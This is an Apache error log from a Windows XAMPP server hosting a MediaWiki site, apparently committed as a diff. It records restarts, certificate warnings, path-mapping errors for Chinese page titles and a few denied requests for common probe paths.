+[Fri Apr 22 21:58:49.723840 2022] [mpm_winnt:notice] [pid 6528:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 21:58:49.723840 2022] [mpm_winnt:notice] [pid 6528:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 21:58:49.723840 2022] [core:notice] [pid 6528:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 21:58:49.725787 2022] [mpm_winnt:notice] [pid 6528:tid 588] AH00418: Parent: Created child process 8060
+[Fri Apr 22 21:58:50.011922 2022] [ssl:warn] [pid 8060:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:58:50.042193 2022] [ssl:warn] [pid 8060:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 21:58:50.070511 2022] [mpm_winnt:notice] [pid 8060:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 21:59:59.485552 2022] [authz_core:error] [pid 8060:tid 1812] [client 192.241.214.157:55508] AH01630: client denied by server configuration: C:/xamppp/htdocs/owa
+[Fri Apr 22 22:00:24.843950 2022] [authz_core:error] [pid 8060:tid 1812] [client 192.241.212.218:32976] AH01630: client denied by server configuration: C:/xamppp/htdocs/ecp
+[Fri Apr 22 22:06:08.209091 2022] [core:error] [pid 8060:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:57409] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 22:08:40.426883 2022] [mpm_winnt:notice] [pid 6528:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:08:42.428824 2022] [mpm_winnt:notice] [pid 8060:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:08:42.732537 2022] [mpm_winnt:notice] [pid 6528:tid 588] AH00430: Parent: Child process 8060 exited successfully.
+[Fri Apr 22 22:08:44.120237 2022] [ssl:warn] [pid 6244:tid 492] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:08:44.155388 2022] [ssl:warn] [pid 6244:tid 492] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:08:44.188602 2022] [mpm_winnt:notice] [pid 6244:tid 492] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:08:44.188602 2022] [mpm_winnt:notice] [pid 6244:tid 492] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:08:44.188602 2022] [core:notice] [pid 6244:tid 492] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:08:44.193483 2022] [mpm_winnt:notice] [pid 6244:tid 492] AH00418: Parent: Created child process 7620
+[Fri Apr 22 22:08:44.546999 2022] [ssl:warn] [pid 7620:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:08:44.581181 2022] [ssl:warn] [pid 7620:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:08:44.614387 2022] [mpm_winnt:notice] [pid 7620:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:12:49.251045 2022] [core:error] [pid 7620:tid 1832] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:59885] AH00127: Cannot map GET /mediawiki/index.php/Tech:%E6%B2%99%E7%9B%92 HTTP/1.1 to file
+[Fri Apr 22 22:14:00.526365 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60357] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=Tech:%E6%B2%99%E7%9B%92&action=edit&redlink=1
+[Fri Apr 22 22:14:37.738291 2022] [authz_core:error] [pid 7620:tid 1808] [client 45.155.204.146:40770] AH01630: client denied by server configuration: C:/xamppp/htdocs/vendor
+[Fri Apr 22 22:14:38.548833 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60596] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=Tech:%E6%B2%99%E7%9B%92&action=edit&redlink=1
+[Fri Apr 22 22:15:05.617200 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60763] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 22:15:21.486328 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60858] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 22:15:42.123043 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60999] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 22:17:15.031267 2022] [core:error] [pid 7620:tid 1800] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:61672] AH00127: Cannot map GET /mediawiki/index.php/%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92&action=edit
+[Fri Apr 22 22:17:29.806666 2022] [core:error] [pid 7620:tid 1808] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:61783] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php?title=%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92
+[Fri Apr 22 22:17:41.202156 2022] [core:error] [pid 7620:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:61862] AH00127: Cannot map GET /mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2?from=&to=&namespace=3000 HTTP/1.1 to file, referer: http://121.4.151.34/mediawiki/index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2
+[Fri Apr 22 22:21:34.099651 2022] [mpm_winnt:notice] [pid 6244:tid 492] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:21:36.102568 2022] [mpm_winnt:notice] [pid 7620:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:21:36.444362 2022] [mpm_winnt:notice] [pid 6244:tid 492] AH00430: Parent: Child process 7620 exited successfully.
+[Fri Apr 22 22:21:37.639697 2022] [ssl:warn] [pid 6268:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:21:37.678754 2022] [ssl:warn] [pid 6268:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:21:37.718784 2022] [mpm_winnt:notice] [pid 6268:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:21:37.718784 2022] [mpm_winnt:notice] [pid 6268:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:21:37.718784 2022] [core:notice] [pid 6268:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:21:37.720743 2022] [mpm_winnt:notice] [pid 6268:tid 576] AH00418: Parent: Created child process 3644
+[Fri Apr 22 22:21:38.008827 2022] [ssl:warn] [pid 3644:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:21:38.041058 2022] [ssl:warn] [pid 3644:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:21:38.067428 2022] [mpm_winnt:notice] [pid 3644:tid 512] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:33:38.196871 2022] [mpm_winnt:notice] [pid 6268:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:33:40.199788 2022] [mpm_winnt:notice] [pid 3644:tid 512] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:33:40.484943 2022] [mpm_winnt:notice] [pid 6268:tid 576] AH00430: Parent: Child process 3644 exited successfully.
+[Fri Apr 22 22:33:41.565032 2022] [ssl:warn] [pid 7552:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:33:41.607028 2022] [ssl:warn] [pid 7552:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:33:41.639252 2022] [mpm_winnt:notice] [pid 7552:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:33:41.639252 2022] [mpm_winnt:notice] [pid 7552:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:33:41.639252 2022] [core:notice] [pid 7552:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:33:41.642186 2022] [mpm_winnt:notice] [pid 7552:tid 576] AH00418: Parent: Created child process 1044
+[Fri Apr 22 22:33:42.025979 2022] [ssl:warn] [pid 1044:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:33:42.056260 2022] [ssl:warn] [pid 1044:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:33:42.084567 2022] [mpm_winnt:notice] [pid 1044:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:35:39.385370 2022] [mpm_winnt:notice] [pid 7552:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:35:41.387322 2022] [mpm_winnt:notice] [pid 1044:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:35:41.668568 2022] [mpm_winnt:notice] [pid 7552:tid 576] AH00430: Parent: Child process 1044 exited successfully.
+[Fri Apr 22 22:35:44.636347 2022] [ssl:warn] [pid 5496:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:35:44.679318 2022] [ssl:warn] [pid 5496:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:35:44.709592 2022] [mpm_winnt:notice] [pid 5496:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:35:44.709592 2022] [mpm_winnt:notice] [pid 5496:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:35:44.709592 2022] [core:notice] [pid 5496:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:35:44.712526 2022] [mpm_winnt:notice] [pid 5496:tid 580] AH00418: Parent: Created child process 3208
+[Fri Apr 22 22:35:45.074833 2022] [ssl:warn] [pid 3208:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:35:45.105108 2022] [ssl:warn] [pid 3208:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:35:45.132450 2022] [mpm_winnt:notice] [pid 3208:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:37:23.067047 2022] [mpm_winnt:notice] [pid 5496:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:37:25.068986 2022] [mpm_winnt:notice] [pid 3208:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:37:25.324844 2022] [mpm_winnt:notice] [pid 5496:tid 580] AH00430: Parent: Child process 3208 exited successfully.
+[Fri Apr 22 22:37:26.601229 2022] [ssl:warn] [pid 2932:tid 592] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:37:26.636383 2022] [ssl:warn] [pid 2932:tid 592] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:37:26.673506 2022] [mpm_winnt:notice] [pid 2932:tid 592] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:37:26.673506 2022] [mpm_winnt:notice] [pid 2932:tid 592] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:37:26.673506 2022] [core:notice] [pid 2932:tid 592] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:37:26.675444 2022] [mpm_winnt:notice] [pid 2932:tid 592] AH00418: Parent: Created child process 5452
+[Fri Apr 22 22:37:26.962541 2022] [ssl:warn] [pid 5452:tid 536] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:37:26.994775 2022] [ssl:warn] [pid 5452:tid 536] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:37:27.022129 2022] [mpm_winnt:notice] [pid 5452:tid 536] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:38:59.720381 2022] [mpm_winnt:notice] [pid 2932:tid 592] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:39:01.722325 2022] [mpm_winnt:notice] [pid 5452:tid 536] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:39:01.966480 2022] [mpm_winnt:notice] [pid 2932:tid 592] AH00430: Parent: Child process 5452 exited successfully.
+[Fri Apr 22 22:39:03.208656 2022] [ssl:warn] [pid 5836:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:39:03.248709 2022] [ssl:warn] [pid 5836:tid 588] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:39:03.282888 2022] [mpm_winnt:notice] [pid 5836:tid 588] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:39:03.282888 2022] [mpm_winnt:notice] [pid 5836:tid 588] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:39:03.282888 2022] [core:notice] [pid 5836:tid 588] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:39:03.284837 2022] [mpm_winnt:notice] [pid 5836:tid 588] AH00418: Parent: Created child process 1344
+[Fri Apr 22 22:39:03.666674 2022] [ssl:warn] [pid 1344:tid 520] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:39:03.705739 2022] [ssl:warn] [pid 1344:tid 520] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:39:03.734057 2022] [mpm_winnt:notice] [pid 1344:tid 520] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:41:58.572921 2022] [mpm_winnt:notice] [pid 5836:tid 588] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:42:00.574872 2022] [mpm_winnt:notice] [pid 1344:tid 520] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:42:00.870768 2022] [mpm_winnt:notice] [pid 5836:tid 588] AH00430: Parent: Child process 1344 exited successfully.
+[Fri Apr 22 22:42:02.707698 2022] [ssl:warn] [pid 2348:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:42:02.779963 2022] [ssl:warn] [pid 2348:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:42:02.818043 2022] [mpm_winnt:notice] [pid 2348:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:42:02.818043 2022] [mpm_winnt:notice] [pid 2348:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:42:02.818043 2022] [core:notice] [pid 2348:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:42:02.820006 2022] [mpm_winnt:notice] [pid 2348:tid 576] AH00418: Parent: Created child process 5116
+[Fri Apr 22 22:42:03.176450 2022] [ssl:warn] [pid 5116:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:42:03.213568 2022] [ssl:warn] [pid 5116:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:42:03.249689 2022] [mpm_winnt:notice] [pid 5116:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:46:15.199942 2022] [mpm_winnt:notice] [pid 2348:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 22:46:17.201885 2022] [mpm_winnt:notice] [pid 5116:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 22:46:17.529032 2022] [mpm_winnt:notice] [pid 2348:tid 576] AH00430: Parent: Child process 5116 exited successfully.
+[Fri Apr 22 22:46:18.704832 2022] [ssl:warn] [pid 5040:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:46:18.749752 2022] [ssl:warn] [pid 5040:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:46:18.788810 2022] [mpm_winnt:notice] [pid 5040:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 22:46:18.788810 2022] [mpm_winnt:notice] [pid 5040:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 22:46:18.788810 2022] [core:notice] [pid 5040:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 22:46:18.792721 2022] [mpm_winnt:notice] [pid 5040:tid 576] AH00418: Parent: Created child process 6168
+[Fri Apr 22 22:46:19.114989 2022] [ssl:warn] [pid 6168:tid 488] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:46:19.148190 2022] [ssl:warn] [pid 6168:tid 488] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 22:46:19.178464 2022] [mpm_winnt:notice] [pid 6168:tid 488] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 22:48:10.753302 2022] [authz_core:error] [pid 6168:tid 1812] [client 45.155.204.146:58026] AH01630: client denied by server configuration: C:/xamppp/htdocs/vendor
+[Fri Apr 22 22:59:17.783120 2022] [php7:warn] [pid 6168:tid 1804] [client 117.184.69.178:59994] PHP Warning:  md5_file(C:\\Users\\Administrator\\lox\\mediawiki/): failed to open stream: No such file or directory in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\OutputPage.php on line 4020, referer: http://121.4.151.34/?redirect=no
+[Fri Apr 22 22:59:17.783604 2022] [php7:warn] [pid 6168:tid 1804] [client 117.184.69.178:59994] PHP Warning:  OutputPage::transformFilePath: Failed to hash C:\\Users\\Administrator\\lox\\mediawiki/ [Called from OutputPage::transformFilePath in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\OutputPage.php at line 4022] in C:\\Users\\Administrator\\lox\\mediawiki\\includes\\debug\\MWDebug.php on line 498, referer: http://121.4.151.34/?redirect=no
+[Fri Apr 22 23:00:55.160559 2022] [core:error] [pid 6168:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60628] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2?redirect=no HTTP/1.1 to file
+[Fri Apr 22 23:01:05.036051 2022] [core:error] [pid 6168:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60693] AH00127: Cannot map GET /index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2?redirect=no HTTP/1.1 to file
+[Fri Apr 22 23:01:27.610764 2022] [core:error] [pid 6168:tid 1796] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:60848] AH00127: Cannot map GET /index.php/%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2?redirect=no HTTP/1.1 to file
+[Fri Apr 22 23:02:34.968696 2022] [mpm_winnt:notice] [pid 5040:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:02:36.971609 2022] [mpm_winnt:notice] [pid 6168:tid 488] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:02:37.273868 2022] [mpm_winnt:notice] [pid 5040:tid 576] AH00430: Parent: Child process 6168 exited successfully.
+[Fri Apr 22 23:02:44.679137 2022] [ssl:warn] [pid 8060:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:02:44.719674 2022] [ssl:warn] [pid 8060:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:02:44.752876 2022] [mpm_winnt:notice] [pid 8060:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:02:44.752876 2022] [mpm_winnt:notice] [pid 8060:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:02:44.752876 2022] [core:notice] [pid 8060:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:02:44.755807 2022] [mpm_winnt:notice] [pid 8060:tid 580] AH00418: Parent: Created child process 7476
+[Fri Apr 22 23:02:45.056101 2022] [ssl:warn] [pid 7476:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:02:45.087346 2022] [ssl:warn] [pid 7476:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:02:45.115175 2022] [mpm_winnt:notice] [pid 7476:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:03:45.020956 2022] [core:error] [pid 7476:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:61831] AH00127: Cannot map GET /index.php/%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92?redirect=no HTTP/1.1 to file
+[Fri Apr 22 23:04:34.590096 2022] [core:error] [pid 7476:tid 1824] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:62110] AH00127: Cannot map GET /index.php/%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92 HTTP/1.1 to file
+[Fri Apr 22 23:14:33.541359 2022] [mpm_winnt:notice] [pid 8060:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:14:35.543298 2022] [mpm_winnt:notice] [pid 7476:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:14:35.838720 2022] [mpm_winnt:notice] [pid 8060:tid 580] AH00430: Parent: Child process 7476 exited successfully.
+[Fri Apr 22 23:14:37.462745 2022] [ssl:warn] [pid 7964:tid 496] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:14:37.498388 2022] [ssl:warn] [pid 7964:tid 496] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:14:37.531597 2022] [mpm_winnt:notice] [pid 7964:tid 496] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:14:37.531597 2022] [mpm_winnt:notice] [pid 7964:tid 496] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:14:37.531597 2022] [core:notice] [pid 7964:tid 496] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:14:37.534520 2022] [mpm_winnt:notice] [pid 7964:tid 496] AH00418: Parent: Created child process 5628
+[Fri Apr 22 23:14:37.839700 2022] [ssl:warn] [pid 5628:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:14:37.872893 2022] [ssl:warn] [pid 5628:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:14:37.900731 2022] [mpm_winnt:notice] [pid 5628:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:15:03.099458 2022] [core:error] [pid 5628:tid 1812] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:49251] AH00127: Cannot map GET /%E5%BC%80%E5%8F%91%E8%80%85:%E6%B2%99%E7%9B%92 HTTP/1.1 to file
+[Fri Apr 22 23:15:22.825055 2022] [core:error] [pid 5628:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:49383] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/?redirect=no
+[Fri Apr 22 23:15:24.306986 2022] [core:error] [pid 5628:tid 1804] (20024)The given path is misformatted or contained invalid characters: [client 117.184.69.178:49399] AH00127: Cannot map GET /%E7%89%B9%E6%AE%8A:%E7%89%B9%E6%AE%8A%E9%A1%B5%E9%9D%A2 HTTP/1.1 to file, referer: http://121.4.151.34/?redirect=no
+[Fri Apr 22 23:19:57.839273 2022] [mpm_winnt:notice] [pid 7964:tid 496] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:19:59.842197 2022] [mpm_winnt:notice] [pid 5628:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:20:00.117604 2022] [mpm_winnt:notice] [pid 7964:tid 496] AH00430: Parent: Child process 5628 exited successfully.
+[Fri Apr 22 23:20:01.483318 2022] [ssl:warn] [pid 2332:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:20:01.527754 2022] [ssl:warn] [pid 2332:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:20:01.560955 2022] [mpm_winnt:notice] [pid 2332:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:20:01.560955 2022] [mpm_winnt:notice] [pid 2332:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:20:01.560955 2022] [core:notice] [pid 2332:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:20:01.563892 2022] [mpm_winnt:notice] [pid 2332:tid 576] AH00418: Parent: Created child process 4496
+[Fri Apr 22 23:20:01.858316 2022] [ssl:warn] [pid 4496:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:20:01.893476 2022] [ssl:warn] [pid 4496:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:20:01.925223 2022] [mpm_winnt:notice] [pid 4496:tid 512] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:22:16.910100 2022] [mpm_winnt:notice] [pid 2332:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:22:18.912047 2022] [mpm_winnt:notice] [pid 4496:tid 512] AH00364: Child: All worker threads have exited.
